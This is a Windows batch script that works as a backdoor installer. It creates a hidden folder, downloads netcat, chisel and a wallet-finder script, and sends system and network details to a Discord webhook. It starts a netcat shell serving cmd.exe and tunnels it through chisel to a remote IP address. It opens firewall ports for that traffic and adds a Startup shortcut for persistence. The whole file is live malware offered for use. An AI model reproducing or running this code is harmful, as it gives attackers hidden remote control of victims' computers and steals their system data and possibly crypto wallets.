@echo off
rmdir /s /q %homedrive%\Akuma
mkdir %homedrive%\Akuma
attrib +h %homedrive%\Akuma
mkdir %homedrive%\Akuma\nc
%homedrive%
cd %homedrive%\A7uma
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %homedrive%\Akuma\nc\nc.exe
curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %homedrive%\Akuma\chisel.exe
curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %homedrive%\Akuma\WalletFinder.bat
cd %homedrive%\Akuma
echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1165910868031197255/h9_Fo0Wm3rs8oeVYh0OjZpEcLikL4AysneV7u3fW553KFjRlBeC-KnzGJmTJoZnGzQwB >> %homedrive%\Akuma\zonbi.bat
echo %homedrive%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\nc.bat
echo %homedrive%\Akuma\chisel.exe client 103.89.12.83:32101 R:%random%:localhost:32100 >> %homedrive%\Akuma\chisel.bat
echo netsh advfirewall firewall delete rule name=".akuma" >> %homedrive%\Akuma\network.bat
echo netsh advfirewall firewall add rule name=".akuma" dir=in action=allow protocol=TCP localport=32100-32110 >> %homedrive%\Akuma\network.bat
echo netsh advfirewall firewall add rule name=".akuma" dir=out action=allow protocol=TCP localport=32100-32110 >> %homedrive%\Akuma\network.bat
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\nc.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\chisel.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\network.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo y| del "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
start %homedrive%\Akuma\Akuma.vbs
rmdir /s /q %homedrive%\ShiniGami
exit
